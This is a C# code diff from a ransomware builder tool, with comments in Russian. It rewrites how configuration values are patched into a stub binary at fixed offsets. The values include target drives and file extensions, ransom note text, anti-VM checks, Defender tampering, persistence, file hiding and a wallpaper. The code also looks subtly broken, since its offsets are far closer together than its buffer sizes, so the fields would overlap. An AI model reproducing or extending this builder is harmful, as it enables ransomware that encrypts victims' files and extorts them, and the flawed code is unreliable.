@@ -763,55 +763,80 @@ namespace RansomwareBuilder
             return result;
         }
         
+        private Dictionary<string, int> GetOffsets()
+        {
+            return new Dictionary<string, int>
+            {
+                { "|DRIVES|", 0x2B888 },
+                { "|EXTS|", 0x2B892 },
+                { "|ENC_EXT|", 0x2B8A1 },
+                { "|NOTE_NAME|", 0x2B8B3 },
+                { "|NOTE_CONTENT|", 0x2B8C6 },
+                { "|FAKE_NAME|", 0x2B8D3 },
+                { "|ALGO|", 0x2B8DA },
+                { "|FAKE_ENABLED|", 0x2B8EE },
+                { "|HIDE_ENABLED|", 0x2B8FE },
+                { "|ANTI_VM|", 0x2B909 },
+                { "|DEFENDER|", 0x2B91A },
+                { "|PERSISTENCE|", 0x2B92D },
+                { "|HIDE_FILES|", 0x2B93C },
+                { "|DELAY|", 0x2B947 },
+                { "|WALLPAPER_BASE64|", 0x2B95A },
+                { "|WALLPAPER_EXT|", 0x2B96F },
+            };
+        }
+        
+        private Dictionary<string, int> GetSizes()
+        {
+            return new Dictionary<string, int>
+            {
+                { "|DRIVES|", 512 },
+                { "|EXTS|", 2048 },
+                { "|ENC_EXT|", 32 },
+                { "|NOTE_NAME|", 64 },
+                { "|NOTE_CONTENT|", 4096 },
+                { "|FAKE_NAME|", 64 },
+                { "|ALGO|", 8 },
+                { "|FAKE_ENABLED|", 8 },
+                { "|HIDE_ENABLED|", 8 },
+                { "|ANTI_VM|", 8 },
+                { "|DEFENDER|", 8 },
+                { "|PERSISTENCE|", 8 },
+                { "|HIDE_FILES|", 8 },
+                { "|DELAY|", 8 },
+                { "|WALLPAPER_BASE64|", 16384 },
+                { "|WALLPAPER_EXT|", 16 },
+            };
+        }
+        
         // ============================================================
-        // ПАТЧИНГ БИНАРНИКА
+        // НОВЫЙ ПАТЧИНГ ПО СМЕЩЕНИЯМ
         // ============================================================
         private void PatchBinary(byte[] data, string marker, string value)
-{
-    // ============================================================
-    // ПРЯМОЙ ПОИСК МАРКЕРА ПО БАЙТАМ
-    // ============================================================
-    byte[] markerBytes = new byte[marker.Length];
-    for (int i = 0; i < marker.Length; i++)
-        markerBytes[i] = (byte)marker[i];
-    
-    byte[] valueBytes = new byte[value.Length + 1];
-    for (int i = 0; i < value.Length; i++)
-        valueBytes[i] = (byte)value[i];
-    valueBytes[value.Length] = 0; // нуль-терминатор
-    
-    // ============================================================
-    // ЖЕСТКИЕ РАЗМЕРЫ БУФЕРОВ
-    // ============================================================
-    int maxLen = 256;
-    if (marker.Contains("WALLPAPER_BASE64")) maxLen = 16384;
-    else if (marker.Contains("NOTE_CONTENT")) maxLen = 4096;
-    else if (marker.Contains("EXTS")) maxLen = 2048;
-    else if (marker.Contains("DRIVES")) maxLen = 512;
-    else if (marker.Contains("NOTE_NAME") || marker.Contains("FAKE_NAME")) maxLen = 64;
-    else if (marker.Contains("ENC_EXT") || marker.Contains("WALLPAPER_EXT")) maxLen = 32;
-    else maxLen = 8;
-    
-    for (int i = 0; i < data.Length - markerBytes.Length; i++)
-    {
-        bool found = true;
-        for (int j = 0; j < markerBytes.Length; j++)
         {
-            if (data[i + j] != markerBytes[j]) { found = false; break; }
-        }
-        if (found)
-        {
-            int start = i + markerBytes.Length;
-            int copyLen = Math.Min(valueBytes.Length, maxLen);
-            Array.Copy(valueBytes, 0, data, start, copyLen);
+            var offsets = GetOffsets();
+            var sizes = GetSizes();
             
-            for (int k = start + copyLen; k < start + maxLen; k++)
+            if (!offsets.ContainsKey(marker) || !sizes.ContainsKey(marker))
+                return;
+            
+            int start = offsets[marker];
+            int maxLen = sizes[marker];
+            
+            // Подготовка данных (ASCII)
+            byte[] valueBytes = new byte[value.Length + 1];
+            for (int i = 0; i < value.Length; i++)
+                valueBytes[i] = (byte)value[i];
+            valueBytes[value.Length] = 0; // нуль-терминатор
+            
+            // ОБНУЛЯЕМ ВЕСЬ БУФЕР
+            for (int k = start; k < start + maxLen; k++)
                 data[k] = 0;
             
-            return;
+            // ЗАПИСЫВАЕМ НОВОЕ ЗНАЧЕНИЕ
+            int copyLen = Math.Min(valueBytes.Length, maxLen);
+            Array.Copy(valueBytes, 0, data, start, copyLen);
         }
-    }
-}
         
         // ============================================================
         // ОСНОВНАЯ ЛОГИКА СБОРКИ
